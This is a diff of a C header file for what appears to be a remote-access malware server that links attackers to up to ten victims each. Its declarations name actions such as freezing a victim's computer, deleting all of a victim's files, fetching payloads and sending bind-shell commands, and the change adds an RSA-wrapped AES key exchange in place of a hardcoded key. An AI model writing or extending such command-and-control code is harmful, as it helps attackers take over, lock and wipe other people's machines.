@@ -13,14 +13,15 @@
 #include "md5.h"
 #include "client_data_structure.h"
 
-
 #define MTU 1024
-#define PORT 50007
+#define PORT 50008
 #define MAX_VICTIMS_PER_ATTACKER 10
 #define MAX_PAYLOAD_TO_BUFFER_COMMEND_LEN 100
 
+#define RSA_BASE64_AES_KEY_SIZE 500
+#define ENCRYPTED_RECEIVED_DATA_NAME ".temp_enc_file"
 #define ENCRYPTED_TEXT_LEN(len) (int) ((len * 1.36) + 100)
-#define AES_KEY "PASS_AES_KEY" // obfuscate it !!! lol
+
 #define HASH_LEN 34
 #define MAX_BIND_SHELL_COMMAND 500
 #define MAX_PASSWORD_LEN 16
@@ -46,6 +47,7 @@ typedef enum {
 	STUCK_VICTIMS_COMPUTER,
 	DELETE_VICTIMS_ALL_FILES,
 	GET_VICTIM_PAYLOAD,
+	KEY_EXCHANGE,
 } action_type;
 
 typedef struct {
@@ -113,6 +115,8 @@ typedef union{
 	char bind_shell_command[ENCRYPTED_TEXT_LEN(MAX_BIND_SHELL_COMMAND)];
 	char selected_victim_name[ENCRYPTED_TEXT_LEN(MAX_USER_NAME_LEN)];
 	encrypted_file_transformation_protocol file_data;
+	
+	char key_exchange_buffer[RSA_BASE64_AES_KEY_SIZE];
 } encrypted_main_data;
 
 typedef struct {
@@ -129,7 +133,8 @@ fd_set readfds; //set of socket descriptors
 void initialize_connection();
 void add_child_sockets_to_set(client_ptr * client_list);
 void set_attacker_victim_connection (client_ptr * attacker, client_ptr * client_list, int num_of_connected_clients, char * selected_victim_name);
+void recv_attacker_aes_key(client_ptr * curr_client, const char * rsa_base64_to_decrypt);
 void send_to_attacker_connected_victims (client_ptr attacker, client_ptr client_list, int num_of_connected_clients);
 char * encrypt_text (char * text_to_encrypt, char * encrypt_key);
 char * decrypt_text (char * text_to_decrypt, char * decryption_key);
-void send_payload_to_attacker(int attacker_fd);
+void send_payload_to_attacker(int attacker_fd, char * aes_key);
